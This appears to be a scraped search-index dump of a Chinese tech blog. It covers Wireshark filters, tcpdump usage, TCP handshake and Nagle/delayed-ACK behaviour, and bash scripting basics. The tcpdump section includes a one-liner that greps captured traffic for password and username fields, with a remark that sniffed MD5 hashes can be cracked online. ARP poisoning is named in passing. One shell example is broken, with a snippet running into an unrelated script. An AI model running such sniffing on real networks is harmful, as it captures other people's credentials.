(GIL)?multiprocessing-vs-multithreading-in-python-what-you-need-to-knowA. Jesse Jiryu DavisHow Do Python Coroutines WorkA Jesse Jiryu Davis Grok the GIL Write Fast And Thread Safe Python PyCon 2017 the only thing two threads cann’t do in once in Python is run pythonBehold, my friends, the getaddrinfo lock in Python’s socketmodule.c: A. Jesse Jiryu Davis关于python中parallel dns query的文章也很好uvloop跑分asyncio in python","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"tcpdump和wireshark使用手册","date":"2018-11-10T20:57:53.000Z","path":"2018/11/10/2018-11-10-tcpdump-and-wireshark-etc/","text":"wireshark expression cheetsheettcpdump cheetwireshark能抓tcp,arp,http,dns,udp,icmp,dhcp… 先从wireshark说起，在win10上安装wireshark需要顺带装上winpacp，不过现在的安装包默认都会提示去安装，所以也都很简单tcpdump在Linux上比较容易安装，类似于wireshark的command line tool wireshark的filter现在wireshark的filter都会自动提示了，所以基本上随手敲几个就行了 http ##只看http的http.requesttcp.dstport == 443 ## 只看https的tcp.port == 113 ## 不管是source还是destination，只要是port 113的都筛出来(113是一个特殊的端口 Identification Protocol, Ident)udp.port== 53 ## 筛选出所有的dns查询ip.addr eq 192.168.1.3 and ip.addr eq 192.168.1.1 //假设本机ip是192.168.1.3并且路由器是192.168.1.1的话，这个可以筛选出所有的ipv4包ip.src == 192.168.1.3 &amp;&amp; tcp.port == 80 //两个命令串联起来也是可以的ip.addr //既包含src也包含dstudp ||http // udp或者http的包frame.len &lt;=128 //显示所有体积小于128个字节的包 //如果一开始就只对特定协议感兴趣capture -&gt; filters 里面可以选择只抓某些协议的包。因为默认是什么都抓，这样会少很多 一些有用的操作选中一个column，右键 -&gt; follow -&gt;tcpstream ，可以查看这个packet的来回信息。（如果是http的话，request和response都给出来了）菜单栏上的Statistics -&gt; conversatitons （查看所有的会话）wireshark的结果可以save成.cap文件，下次可以打开菜单栏上的Statistics -&gt; protocol Hierarchy(查看所有的协议)菜单栏view -&gt; coloring rule（直接将特定的协议变成特定颜色的背景，方便识别）view -&gt; time displayformat(格式化packet的时间显示成便于识别的时间，因为默认的显示单位是毫秒)Statistics -&gt; endpoints // 查看所有连接过的ip Statistics -&gt; packet length //查看所有的packet length（多数时候包的大小在40-79和1280-2559这个区间里面，没有小于40的，因为最少得40个字节） arp(addression resolution protocol)一台电脑在发出去一个包之前，已经知道dest的ip地址，但是不知道这个ip地址对于的mac地址是多少，于是会发出一份arp request。在局域网内部，是这样的 who has 192.168.1.1 ? Tell 192.168.1.7 //电脑发出arp请求 192.168.1.1 is at 00:xx:00:xe:b5 //很快得到了回应 arp包结构 一个ipv4地址需要32个bit表示,192.168.1.1这种写法叫做base10一般情况下，192.168这俩一般表示的是network address, .1.1这俩一般表示的是Host address(physical computer)net mask(255.255.0.0) 192.168.1/16。 选中一个tcp包，查看Internet Protocol Version4 ..(这里就是第三层,network层了)。从上到下依次是version: 4Header length 20bytesDifferentiated Services Filed(不懂)Total Length(这个是包含了)Identification(类似于id)Flags : 0x4000, Dont’t fragment(这个牵涉到mtu,maximum transmission unit size, 这个数值在ethernet上是1500bytes。假如一个包大小超过这个数，切成两个,也就是fragment.这个Flags里面可以看到More fragment: not set （0），意思就是说这个包没有被切成两个。有两种情况下这个标志设为0，一是没有分包，而是这个包恰好是最后一个)Fragment offset：0 (假如被切成两个了，这里就表示当前这个包是被切完之后的第一个还是第二个，就当是index吧)。这个包是访问google时留下的 有一个Time to live:128 (就是说这个包最多走128hop，就是最多经手128个router就丢掉) 再看第四层（Transport layer），也就是tcp,udp这类了。还是上面这个包从上到下依次是Source PortDestination Port :443 //https无疑stream index: 4sequence number 496 //确保数据没有丢失Acknowledgement number : 4043 //下一个包的sequence numberFlags(urg:urgent,push:push,rst:reset,sin&amp;fin(finished))这张图里面写的是Acknowledgment(显然是ack包)window size value: 2053(这个是tcp receiver buffer，单位是byte，这个数值变来变去的)checksum(检查数据完整) 说一说handshaketcp packets始于一个handshake检查端口，发送一个sequence number(随机的),客户端会发送一个syn packet到接受方。接受方会返回一个syn ack packet,接下来客户端发送一个ack packet。上述步骤每一次sequence number都会+1 1. Client 发送 SYN 包（seq: x），告诉 Server：我要建立连接；Client 进入SYN-SENT状态； 2. Server 收到 SYN 包后，发送 SYN+ACK 包（seq: y; ack: x+1），告诉它：好的；Server 进入SYN-RCVD状态； 3. Client 收到 SYN+ACK 包后，发现 ack=x+1，于是进入ESTABLISHED状态，同时发送 ACK 包（seq: x+1; ack: y+1）给 Server；Server 发现 ack=y+1，于是也进入ESTABLISHED状态； 接下来就是互相发送数据、接收数据了…… tcp teardown(四次挥手告别)host发送给destination一个fin acknowledge packetdestination发挥一个ack packet和一个fin ack packethost再发送一个ack(这些都可以从flags里面看到) 注意，可以是连接的任意一方主动 close，这里假设 Client 主动关闭连接： 1. Client 发送 FIN 包，告诉 Server：我已经没有数据要发送了；Client 进入FIN-WAIT-1状态； 2. Server 收到 FIN 包后，回复 ACK 包，告诉 Client：好的，不过你需要再等会，我可能还有数据要发送；Server 进入CLOSE-WAIT状态；而 Client 收到 ACK 包后，继续等待 Server 做好准备， Client 进入FIN-WAIT-2状态； 3. Server 准备完毕后，发送 FIN 包，告诉 Client：我也没有什么要发送了，准备关闭连接吧；Server 进入LAST-ACK状态； 4. Client 收到 FIN 包后，知道 Server 准备完毕了，于是给它回复 ACK 包，告诉它我知道了，于是进入TIME-WAIT状态；而 Server 收到 ACK 包后，即进入CLOSED状态；Client 等待 2MSL 时间后，没有再次收到 Server 的 FIN 包，于是确认 Server 收到了 ACK 包并且已关闭，于是 Client 也进入CLOSED状态； MSL即报文最大生存时间，RFC793 中规定 MSL 为 2 分钟，但这完全是从工程上来考虑，对于现在的网络，MSL=2分钟可能太长了一些。实际应用中常用的是 30 秒、1 分钟、2 分钟等；可以修改/etc/sysctl.conf内核参数，来缩短TIME_WAIT的时间，避免不必要的资源浪费。 所以整个tcp传输的过程看起来像这样 有时候会看到rest，意味着连接突然中断了（tcp会断掉这个sequence的所有packet，把flags里面的reset设置为1） DHCP (Dynamic Host Configuration Protocol)这个位于第7层DNS包结构DNS走的是udp的53端口，发出去的请求的dst.port=53，收到的response的src.port = 53.在局域网内,dst就是路由ip(192.168.1.1) 访问tmall主页一来一回的 先看request在Domain Name System query的Flags下有一个opcode(这个值可能是standard query，也可能是authoritated answers,如果response是从name server回来的话)Flags下面还有一个Truncated(意思就是你发出的这个包是不是太大了，太大了塞不进一个packet)还有Recursion desire:Do query recursively(这意味着servername支持recursive query，就是当前dns server找不到的话，会往上继续查找) 再来看response结果在Answers里面 https结构wireshark上显示成tlsv1.2找application data，在secure socket layer里面有encrypted Application Data(加密过的)如果是http的话，在hypertext transfer protocol里面最底下会显示html encoded的post的data tcp retransmission网速慢的时候(latency高)tcp会发现这些问题，重发如果一个packet始终没有收到ack(在限定的时间内)，重发两个packet之间的时间叫做round-trip time,每当出现retransmission的时候，z这个packet的rto直接double（windows上默认尝试5次，linux上有的达到15次），一直这样double的操作超过5次后，直接丢包 如果找到一个retransmission的包rto time在transmission control protocol下面的expert info，里面有个(the rto for this segment was: 0.220 seconds)如果这次重发还不成功,0.44s后,0.88秒后。直到超过5次尝试 tcp duplicatesduplicate ack，这通常出现在receiver收到了out of order packet。所有的tcp连接都有一个isn( initial sequence number)，就是初始序列号了。后续的packet会在这个数字的基础上,data payload传递了多少，这个数就加多少。比方说src这边的isn是1000，发送了200bytes的数据，那么我收到的ack应该是1200. 上述是一切正常的情况，但是假如src这边的isn是1000，发出去200bytes，dst那边返回1200的sequence number的ack。此时，src这边出了问题，发出去一个1400的packet，dst那边就会认为，你这不对，重来一遍（发回一个1200的ack，一直尝试3次，直到src终于反应过来发出1200的包，这个正确的包叫做fast retransmission）。在wireshark里面，dst发回来的重复的ack会显示为tcp dup ack。src最后一次正确的packet显示为tcp fast retransmission 所以一旦出现了skip isn的情况，要么dst发回dup ack，要么src发出fast retransmission tcp flow control即sliding window mechanism，原理是调整retransmission的速度（根据dst的recive window），因为dst那边是有一个tcp buffer space的，万一这个buffer溢出，就会造成丢包wireshark中，在transmission control protocol下面，有一个window size.比方说，src发送了一个isn =1的packet，window size = 8760。dst返回一个ack number = 2921的ack,同时window size变成5840.这么来来回回，这个window迟早被消耗玩，tcp zero window（正常情况下dst的应用层能够读走这部分数据，但是如果接收方读取速度跟不上的话，会发送一个ack包，告诉src发送慢一点,src接收到了之后，就会一直发keep-alive packet(非常小的包，66byte).如果dst那边还没处理好的话，会一直返回Tcp Zero window 的ack，这样往返数次）。这个专门的名词叫做Zero Window Probe在wireshark里面,tcp zero window的ack包里面会显示window size value: 0只要有等待的地方都可能出现DDoS攻击，Zero Window也不例外，一些攻击者会在和HTTP建好链发完GET请求后，就把Window设置为0，然后服务端就只能等待进行ZWP，于是攻击者会并发大量的这样的请求，把服务器端的资源耗尽。（关于这方面的攻击，大家可以移步看一下Wikipedia的SockStress词条） high latency这个主要的标志是time这一栏超过1秒，延迟的原因很多。可以分析是去程慢还是返程慢。也有可能是服务器处理很慢。network baseline(正常的延迟是多少，比如国内到美国一般150ms以上是起码的，这是物理决定的) tcpdump安装 sudo apt-get install tcpdump 使用sudo tcpdump -i wlan0 ##i的意思是指定某个网络接口，输出非常多sudo tcpdump -D ##哪些接口可用sudo tcpdump -i 2 ##只看-D显示的第二个设备sudo tcpdump -v -A ## A的意思是ASCII，至少内容容易辨识sudo tcpdump -i 2 -c 4 ##只抓4个包sudo tcpdump -i 2 -c -4 -n arp ##只抓arp的包,n的意思是supress host name,也能用来指定协议sudo tcpdump -i 2 -c -4 -n tcp ##只抓4个tcpsudo tcpdump -i 2 -c -4 -n icmp ##只抓4个icmpsudo tcpdump -i 2 -c -4 src 192.168.1.1 ##指定src sudo tcpdump -i 2 -c -4 -w filename.pcap ##保存到文件,这个文件用tcpdump打开也是可以的sudo tcpdump -r filename.pcap ##读取这个文件 可以和egrep一起用sudo tcpdump -A -i 2 | egrep -i ‘pass=|pwd=|password=|username=’ –color=auto –line-buffered//比方说抓到了md5过的密码，随便找个解密网站，就能解出来了 ARP欺骗 arp cache poisoning attack常用的端口号各种可能的pcap文件本文大量文字图片出处","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"tcp-nagel-algorithm-and-delay-ack","date":"2018-11-06T13:25:55.000Z","path":"2018/11/06/2018-11-06-nagel-algorithm-and-delay-ack/","text":"Nagle’s Algorithm 和 Delayed ACK 一起用在特定场景下可能会造成网速不必要的延迟傳送 TCP 封包的時候， TCP header 占 20 bytes， IPv4 header 占 20 bytes，若傳送的資料太小， TCP/IPv4 headers 造成的 overhead (40bytes) 並不划算。想像傳送資料只有 1 byte，卻要另外傳 40 bytes header，這是很大的浪費。若網路上有大量小封包，會占去網路頻寬，可能會造成網路擁塞 。这个是针对发送方而言的。 一个TCP数据包的传输至少需要固定的40字节头部信息(20字节TCP + 20字节IP)，如果数据包实际负载都比较小的话，那么传输的效率就非常低，但是如果将这些小包的负载都尽量集中起来，封装到一个TCP数据包中进行传输，那么传输效率势必将会大大提高。此处我们再次强调，TCP传输的是一个字节流，本身不存在所谓的离散形式的数据包的概念，协议可以任意组合、拆分每次调用实际传输的数据长度。 Nagle算法的思路在wiki上也能找到 if there is new data to send if the window size &gt;= MSS and available data is &gt;= MSS send complete MSS segment now else if there is unconfirmed data still in the pipe enqueue data in the buffer until an acknowledge is received else send data immediately end if end if end if 如果发送内容大于1个MSS， 立即发送；如果之前没有包未被确认， 立即发送；如果之前有包未被确认， 缓存发送内容；如果收到ack， 立即发送缓存的内容。 概括地说来，其流程表述为：(a)不考虑窗口流量控制的限制，一旦累积的数据达到MSS就立即执行传输；(b)否则如果当前有未ACK的数据，就将数据堆积到发送队列里延迟发送；(c)如果没有待需要ACK的数据，就立即发送。简单说来，就是在数据没有累积到MSS的大小情况下，整个连接中允许有未ACK的数据。 Nagel算法本质上就是个时间换带宽的方法，所以对于那些带宽要求不大但对实时性要求高的程序，比如类似网络游戏类，需要使用TCP_NODELAY这个socket选项来关闭这个特性以减小延时发生。不过话外说来，对于这类程序或许使用UDP协议也是个选择。 想象一下，同时丢出去一大堆只有50个字节的包还是会造成带宽的浪费，还不如攒在一起发出去。 在Nagle算法中参数MSS(maximum segment size，IPv4默认值是576-20-20 = 536)Maximum_segment_size在wiki上还有专门的介绍 一些关键词： acknowledged: TCP 傳送封包時會帶有流水號 ，起始值隨機，後面每傳 1 byte 就 +1。對方收到後會回傳 ACK 封包，帶有最後收到 byte 的數字。比方說收到 100 bytes，再收到 200 bytes，只要 ACK「起始值+300」即可。 sliding window: 允許傳送 unacked bytes 的最大值，確保在網路不佳的情況下，傳送端不會傳送過多封包加重擁塞。sliding window 的最大值是 2¹⁶ = 64 (KB) Delay ACKACK 也是小封包，為了避免產生太多小封包，所以接收端不會每次收到封包都立即發 ACK，如果之後剛好需要送資料 ，順便帶上 ACK去可以省去小封包。實例: telnet server 會回傳使用者剛打的字，順便送 ACK 就可以省去小封包。 Linux的实现在 __tcp_ack_snd_check这个方法 通常最多延遲 200ms，RFC 規定不能超過 500ms。每收到兩個 full-sized packet，一定要回一次 ACK。 兩者合用的問題假設傳送端有開 Nagle’s Algorithm，接收端有開 delayed ACK (兩者在 Linux 都是預設值)。 以 HTTP 為例，若 server 的 response 被切成兩次 send，一次送 header，一次送 body，兩者都 &lt;MSS。 server 送完 header 後，因為 client 沒有回 ACK (delayed ACK)，server 也不會送 body (應用層覺得它已經送出了，但 kernel 還沒送)。client 過了 200ms，送出收到 header 的 ACK。server 收到 ACK 後，送出 body。於是 client 多等了 200ms 才收到完整的 response。 tcp缓冲的概念tcp缓冲这些东西对于应用层来说是无感的 socket支持blocking(默认)和non-blocking模式，读写都存在阻塞问题 #include &lt;unistd.h&gt; ssize_t write(int fd, const void *buf, size_t count); 牵涉到tcp缓冲层大小 首先，write成功返回，只是buf中的数据被复制到了kernel中的TCP发送缓冲区。至于数据什么时候被发往网络，什么时候被对方主机接收，什么时候被对方进程读取，系统调用层面不会给予任何保证和通知。已经发送到网络的数据依然需要暂存在send buffer中，只有收到对方的ack后，kernel才从buffer中清除这一部分数据，为后续发送数据腾出空间。接收端将收到的数据暂存在receive buffer中，自动进行确认。但如果socket所在的进程不及时将数据从receive buffer中取出，最终导致receive buffer填满，由于TCP的滑动窗口和拥塞控制，接收端会阻止发送端向其发送数据。这些控制皆发生在TCP/IP栈中，对应用程序是透明的，应用程序继续发送数据，最终导致send buffer填满，write调用阻塞。 一般来说，由于接收端进程从socket读数据的速度跟不上发送端进程向socket写数据的速度，最终导致发送端write调用阻塞。 而read调用的行为相对容易理解，从socket的receive buffer中拷贝数据到应用程序的buffer中。read调用阻塞，通常是发送端的数据没有到达。 read总是在接收缓冲区有数据时立即返回，而不是等到给定的read buffer填满时返回。只有当receive buffer为空时，blocking模式才会等待，而nonblock模式下会立即返回-1（errno = EAGAIN或EWOULDBLOCK） blocking的write只有在缓冲区足以放下整个buffer时才返回（与blocking read并不相同） nonblock write则是返回能够放下的字节数，之后调用则返回-1（errno = EAGAIN或EWOULDBLOCK） 对于blocking的write有个特例：当write正阻塞等待时对面关闭了socket，则write则会立即将剩余缓冲区填满并返回所写的字节数，再次调用则write失败（connection reset by peer） 最后启示就是应用层进行开发的时候不要零零散散的发数据，尽量攒成一个大一点的包再发出去。不要让系统层去做这件事。TCP_NODELAY 是可以关闭Nagle算法的 todowindow congestion超时重传阻塞，超时， 参考Nagle和Delayed ACK优化算法合用导致的死锁问题Nagle’s Algorithm 和 Delayed ACK 以及 Minshall 的加強版再说TCP神奇的40mstcp缓冲非常好的文章TCP 的那些事儿（下）","tags":[]},{"title":"如何写shell脚本","date":"2018-11-04T08:50:58.000Z","path":"2018/11/04/2018-11-04-how-to-write-shell-scripts/","text":"总结linux下shell脚本语句的语法Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer 是一个典型的图形界面 Shell。 Linux 的 Shell 种类众多，常见的有： Bourne Shell（/usr/bin/sh或/bin/sh） Bourne Again Shell（/bin/bash） C Shell（/usr/bin/csh） K Shell（/usr/bin/ksh） Shell for Root（/sbin/sh）…… 这里说的并不是严格的posix complaint shell，就是那种在各种unix系统中都能运行的shell。因为bash用的最广，所以这里主要针对bash语法进行讲解 Shebang脚本以Shebang)开始 &gt; #!/bin/sh #! 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。 这样的话chmod +X 之后直接./xxx.sh就可以执行了 set -e 和set -x以及pipe fail经常会在别人的bash脚本最前面看到一行 set-e：在阮一峰老师的博客中找到了解释 #!/usr/bin/env bash set -e ## 这个set -e的原因，因为bash一般对错误容忍度比较高，一行命令出了错还能往下走，可是实际生产中，我们希望出了错就此打住。在文件前面写这个就行了 ## 总比下面这些这么写好吧 command || exit 1 command || { echo &quot;command failed&quot;; exit 1; } set -eo pipefail ##set -e对于管道无效，这么写就连管道的错误都拦下来了 $ set -e这行代码之后的任何代码，如果返回一个非0的值，那么整个脚本立即退出，官方的说明是为了防止错误出现滚雪球的现象$ set -o pipefail原文解释如下：If set, the return value of a pipeline is the value of the last (rightmost) command to exit with a non-zero status,or zero if all commands in the pipeline exit successfully. This option is disabled by default.可理解为：告诉 bash 返回从右到左第一个以非0状态退出的管道命令的返回值，如果所有命令都成功执行时才返回0$ set -x //这句话能够在console中显示当前脚本执行了哪些语句 shell中引用变量首先变量是随便定义的，引用的时候前面加一个美元符号就可以了（变量名中不能用破折号-，可以用_） ## MY_VAR=100 ## 这中间不能有空格 ##例：myvar=“Hi there！” echo $myvar ## Hi there！ echo &quot;$myvar&quot; ## Hi there! echo &#39; $myvar&#39; ## $myvar echo \\$myvar ## $myvar ## shell中的大括号有点像js的es6中的spread operator # ls {ex1,ex2}.sh ex1.sh ex2.sh # ls {ex{1..3},ex4}.sh ex1.sh ex2.sh ex3.sh ex4.sh # ls {ex[1-3],ex4}.sh ex1.sh ex2.sh ex3.sh ex4.sh 单引号里面的变量是不能输出变量的值的，所以尽量用双引号 bash的变量是无类型的bash中是没有变量类型的说法的，例如a=1 这句话，你不能认为a是integer类型的。本质上来说，Bash变量是字符串，但是根据环境的不同，Bash允许变量有整数计算和比较。其中的决定因素是变量的值是不是只含有数字. $ a=2 $ echo &quot;$a + 1&quot; 2 + 1 //被当成字符串了 $ echo &quot;$(($a + 1))&quot; 3 //被当成整数了 if else这种逻辑判断怎么写两个数字比较是否相等，大小关系 #!/bin/bash a=10 b=6 if [ $a -eq 10 ]; then echo &quot;a == 10&quot; else echo &quot;not equal&quot; fi if (( $a &gt; $b )); then echo &quot;a greater than b &quot; fi if ($i&lt;5) ## 小括号里的直接执行命令 if [ $i -lt 5 ] if [ $a -ne 1 -a $a != 2 ] ## -a表示&amp;&amp; if [ $a -ne 1] &amp;&amp; [ $a != 2 ] if [[ $a != 1 &amp;&amp; $a != 2 ]] ##&amp;&amp; || 这些东西都能存在于两个中括号里面 上面这个例子就是两个小括号的体现了，两个小括号$((exp))中，双括号中的变量可以不使用$符号引用,exp被作为一个算术表达式判断，比如 a=5; ((a++)) 可将 $a 重定义为6 类似的数字之间的比较还有很多 -eq 等于,如:if [ &quot;$a&quot; -eq &quot;$b&quot; ] -ne 不等于,如:if [ &quot;$a&quot; -ne &quot;$b&quot; ] -gt 大于,如:if [ &quot;$a&quot; -gt &quot;$b&quot; ] -ge 大于等于,如:if [ &quot;$a&quot; -ge &quot;$b&quot; ] -lt 小于,如:if [ &quot;$a&quot; -lt &quot;$b&quot; ] -le 小于等于,如:if [ &quot;$a&quot; -le &quot;$b&quot; ] &lt; 小于(需要双括号),如:((&quot;$a&quot; &lt; &quot;$b&quot;)) &lt;= 小于等于(需要双括号),如:((&quot;$a&quot; &lt;= &quot;$b&quot;)) &gt; 大于(需要双括号),如:((&quot;$a&quot; &gt; &quot;$b&quot;)) &gt;= 大于等于(需要双括号),如:((&quot;$a&quot; &gt;= &quot;$b&quot;)) 判断两个字符串是否相等 if [ &quot;$var1&quot; == &quot;$var2&quot; ]; then ##if 后面必须加then echo &#39;$var1 eq $var2&#39; else echo &#39;$var1 not eq $var2&#39; fi 判断两个字符串是否不相等 if [ &quot;$a&quot;x != &quot;$b&quot;x ]; then echo &quot;$a not equals $b&quot; else echo &quot;$a equals $b&quot; fi 判断字符串是否为空 if [ -z &quot;$d&quot; ] then echo &quot;d is empty&quot; fi str1 = str2 当两个串有相同内容、长度时为真str1 != str2 当串str1和str2不等时为真-n str1 当串的长度大于0时为真(串非空)-z str1 当串的长度为0时为真(空串)str1 当串str1为非空时为真 文件或者目录相关操作 ## 文件不存在 if [ ! -f /etc/nonexisitfile ]; then echo &quot;file not exists&quot; fi ## 文件存在 if [ -f /etc/rc.local ]; then //-f是被测文件是一个regular文件（正常文件，非目录或设备） echo &quot;file exists&quot; fi if [ -d /usr/bin ]; then echo &quot;folder exists&quot; fi if [ ! -f /usr/bin ]; then echo &quot;folder cannot use -f&quot; // 文件不存在 fi if [ -s /usr/bin ]; then echo &quot;folder can use -s&quot; //文件存在 fi if [ -r /usr/bin/watch ]; then echo &quot;i can read this file&quot; //可读权限 fi if [ ! -w /usr/bin/watch ]; then echo &quot;i can not write this file&quot; //可写权限 fi -r file 用户可读为真-w file 用户可写为真-x file 用户可执行为真-f file 文件为正规文件为真-d file 文件为目录为真-c file 文件为字符特殊文件为真-b file 文件为块特殊文件为真-s file 文件大小非0时为真-t file 当文件描述符(默认为1)指定的设备为终端时为真 判断nginx是否在运行，没有运行的话拉起来 #!/bin/sh set -e SERVICE=&quot;nginx&quot; if pgrep -x &quot;$SERVICE&quot; &gt;/dev/null then echo &quot;$SERVICE is running&quot; else echo &quot;$SERVICE stopped&quot; # uncomment to start nginx if stopped systemctl start nginx # mail fi #if [ $(ps -ef | grep -c &quot;ssh&quot;) -gt 1 ]; then echo &quot;true&quot;; fi 检查下当前是否安装了git if ! [ -x &quot;$(command -v git)&quot; ]; then ## command这个关键字是posix compatible的 echo &#39;Error: git is not installed.&#39; &gt;&amp;2 exit 1 fi 在一个文件中查找是否存在某一个单词，如果存在的话执行某项task if grep -q keyword /var/somefile ; then ##这个-q只是避免grep输出找出来的string，我们只需要知道它的返回值是成功还是失败 echo &quot;file contain that word&quot; fi 查看某个命令的输出中有没有某个关键字，有的话执行操作 OUTPUT=&#39;blah blah (Status: 200)&#39; if echo &quot;$OUTPUT&quot; | grep -q &quot;(Status:\\s200)&quot;; then echo &quot;MATCH&quot; fi 与，或，非操作if [ ${OUT_FILE}a != ${OUT_FILE%/*}a ] &amp;&amp; [ ! -d ${OUT_FILE%/*} ]; then ## 用&amp;&amp; 就可以了 _red &#39;Error: Folder do not exist: &#39;${OUT_FILE%/*}&#39;\\n&#39; exit 1 fi -a 与-o 或! 非 字符串相关函数#!/bin/bashbash echo &quot;hello there&quot; foo=&quot;Hello&quot; foo=&quot;$foo World&quot; ## 拼接一个现成的string到另一个string的尾部，用冒号跟美元符号就好了 echo $foo echo &quot;Number of files in this directory: `ls | wc -l`&quot; ## 但是将ls | wc -l的输出作为一个String拼接到一个string中，用单引号 echo &quot;all the files under the directory `ls /usr/*/g* | head -n3`&quot; 想要在bash中设置一个variable为一个命令的输出 #!/bin/bash OUTPUT=&quot;$(ls -1)&quot; ## 注意，这里等于号前后不能有空格 echo &quot;${OUTPUT}&quot; ##那如果就是平时在terminal里面随便敲敲呢，下面这些亲测无误 echo &quot;$(ls -al | wc)&quot; &quot;$(which java)&quot; -h ## 比如说我想把java的路径填充到一段命令中间 echo &quot;$(which java)&quot;/something &gt;&gt; /usr/bin/java/something java=&quot;$(which java)&quot; ${java} --version ## 字符串长度 string=&quot;abcd&quot; echo $ -gt 0 ]; do case &quot;${1}&quot; in --help | -h) usage 0 ;; --domain-list | -l) OUT_TYPE=&#39;DOMAIN_LIST&#39; ;; --insecure | -i) CURL_EXTARG=&#39;--insecure&#39; WGET_EXTARG=&#39;--no-check-certificate&#39; ;; --dns | -d) DNS_IP=&quot;$2&quot; shift ;; --port | -p) DNS_PORT=&quot;$2&quot; shift ;; --ipset | -s) IPSET_NAME=&quot;$2&quot; shift ;; --output | -o) OUT_FILE=&quot;$2&quot; shift ;; --extra-domain-file) EXTRA_DOMAIN_FILE=&quot;$2&quot; shift ;; --exclude-domain-file) EXCLUDE_DOMAIN_FILE=&quot;$2&quot; shift ;; *) _red &quot;Invalid argument: $1&quot; usage 1 ;; esac shift 1 done # Check path &amp; file name if [ -z $OUT_FILE ]; then _red &#39;Error: Please specify the path to the output file(using -o/--output argument).\\n&#39; exit 1 else if [ -z ${OUT_FILE##*/} ]; then ## -z表示字符串的长度为0,-n为大于0 _red &#39;Error: &#39;$OUT_FILE&#39; is a path, not a file.\\n&#39; exit 1 else if [ ${OUT_FILE}a != ${OUT_FILE%/*}a ] &amp;&amp; [ ! -d ${OUT_FILE%/*} ]; then _red &#39;Error: Folder do not exist: &#39;${OUT_FILE%/*}&#39;\\n&#39; exit 1 fi fi fi if [ $OUT_TYPE = &#39;DNSMASQ_RULES&#39; ]; then # Check DNS IP IPV4_TEST=$(echo $DNS_IP | grep -E $IPV4_PATTERN) IPV6_TEST=$(echo $DNS_IP | grep -E $IPV6_PATTERN) if [ &quot;$IPV4_TEST&quot; != &quot;$DNS_IP&quot; -a &quot;$IPV6_TEST&quot; != &quot;$DNS_IP&quot; ]; then _red &#39;Error: Please enter a valid DNS server IP address.\\n&#39; exit 1 fi # Check DNS port if [ $DNS_PORT -lt 1 -o $DNS_PORT -gt 65535 ]; then _red &#39;Error: Please enter a valid DNS server port.\\n&#39; exit 1 fi # Check ipset name if [ -z $IPSET_NAME ]; then WITH_IPSET=0 else IPSET_TEST=$(echo $IPSET_NAME | grep -E &#39;^\\w+$&#39;) if [ &quot;$IPSET_TEST&quot; != &quot;$IPSET_NAME&quot; ]; then _red &#39;Error: Please enter a valid IP set name.\\n&#39; exit 1 else WITH_IPSET=1 fi fi fi if [ ! -z $EXTRA_DOMAIN_FILE ] &amp;&amp; [ ! -f $EXTRA_DOMAIN_FILE ]; then _yellow &#39;WARNING:\\nExtra domain file does not exist, ignored.\\n\\n&#39; EXTRA_DOMAIN_FILE=&#39;&#39; fi if [ ! -z $EXCLUDE_DOMAIN_FILE ] &amp;&amp; [ ! -f $EXCLUDE_DOMAIN_FILE ]; then _yellow &#39;WARNING:\\nExclude domain file does not exist, ignored.\\n\\n&#39; EXCLUDE_DOMAIN_FILE=&#39;&#39; fi } 懒得解释了，就是一个switch case和各种if else 变量($其实就是美元符号了)变量调用符号($) LI=date $LI ## # Tue Dec 5 04:06:18 EST 2017 # 所以经常会有这样的脚本 # Check if user is root if [ $(id -u) != &quot;0&quot; ]; then echo &quot; Not the root user! Try using sudo Command ! &quot; exit 1 fi echo &quot;Pass the test! You are the root user!&quot; ## 亲测下面这种可用 if [ `whoami` = &quot;root&quot; ];then echo &quot;root用户！&quot; else echo &quot;非root用户！&quot; fi ${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。$(cmd) 命令替换，和cmd效果相同，结果为shell命令cmd的输出$((expression)) 和exprexpression效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。 变量分为用户自定义的和环境变量（其实就是系统预设的）,有些区别 用户自定义变量只在当前的shell中生效，环境变量在当前shell和这个shell的所有子shell中生效。环境变量是全局变量，用户自定义变量是局部变量。对系统生效的环境变量名和变量作用是固定的。 常用的环境变量 HOSTNAME：主机名SHELL：当前的shellTREM：终端环境HISTSIZE：历史命令条数SSH_CLIENT：当前操作环境是用ssh链接的，这里记录客户端的ipSSH_TTY：ssh连接的终端是pts/1USER:当前登录的用户 echo $HOSTNAME ## unbutu $? 最后一次执行的命令的返回状态。如果这个变量的值为0，证明上一个命令正确执行；如果这个变量的值非0（具体是哪个数，由命令自己决定），则证明上一个命令执行不正确了。 $$ 当前进程的进程号（PID） $! 后台运行的最后一个进程的进程号（PID） unix下查看环境变量命令： &gt; export windows下查看环境变量: &gt; set shell里面判断一个命令是否执行成功其实在terminal中执行命令的话，有一个小细节：注意看最左下方的符号。上一个命令如果成功的话，是绿色的，不成功的话是红色的。c语言中有一个errornum,shell 里面有差不多的东西，用于判断上一个命令是否返回非0的return value。 # iptables -C INPUT -p tcp --dport 8080 --jump ACCEPT iptables: Bad rule (does a matching rule exist in that chain?). # echo $? 1 # iptables -A INPUT -p tcp --dport 8080 --jump ACCEPT # iptables -C INPUT -p tcp --dport 8080 --jump ACCEPT # echo $? 0 上面这个例子，未曾设置这个iptables rule ，这个命令返回1 ，否则返回0shell里面判断if else就可以这么写 if [ $? -eq 0 ]; then echo &quot;no error from last command&quot; else echo &quot;some error from last command&quot; fi if [ $? != 0 ]; then echo &quot;there&#39;s error from executing last command!&quot; else echo &quot;no error from last command&quot; fi sh xxx.sh出现下面这个错误&gt; [[: not found………………….. 原因是sh不支持这种用法，bash支持。所以改成bash xxx.sh就可以了 ununtu默认的sh不是bash而是一个叫做dash的东西sh只是一个符号链接，最终指向是一个叫做dash的程序，自Ubuntu 6.10以后，系统的默认shell /bin/sh被改成了dash。dash(the Debian Almquist shell) 是一个比bash小很多但仍兼容POSIX标准的shell，它占用的磁盘空间更少，执行shell脚本比bash更快，依赖的库文件更少，当然，在功能上无法与bash相比。dash来自于NetBSD版本的Almquist 